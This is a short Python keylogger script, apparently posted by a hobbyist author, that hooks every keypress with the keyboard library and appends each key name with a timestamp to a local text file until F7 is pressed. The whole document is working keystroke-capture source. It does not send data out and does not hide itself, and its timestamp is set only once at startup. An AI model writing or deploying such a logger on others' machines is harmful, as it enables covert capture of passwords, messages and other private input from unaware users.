# Created By Fattcat #
# Date : 05.08.2023 Slovakia
# GitHub --> https://github.com/Fattcat/
# YouTube --> https://www.youtube.com/channel/UCKfToKJFq-uvI8svPX0WzYQ

import keyboard
import datetime

#while True:
ActualDate = datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
file_path = "E:/AllCaptured/CpKeyLogs/PressedKeys.txt" # Change it by YOURS Directory

def log_key(e):
    with open(file_path, "a") as file:
        file.write("\n" + ActualDate + " " + "Pressed Key : "+ e.name)

print("Press f7 for STOP Script")
keyboard.hook(log_key)
keyboard.wait("f7")
if keyboard.is_pressed("f7"):
    print("Pressed f7 ! Exitting...")
    with open(file_path, "a") as file:
        file.write("\n"*2 + ActualDate + "\n" + "Pressed f7 ! Exitting...")
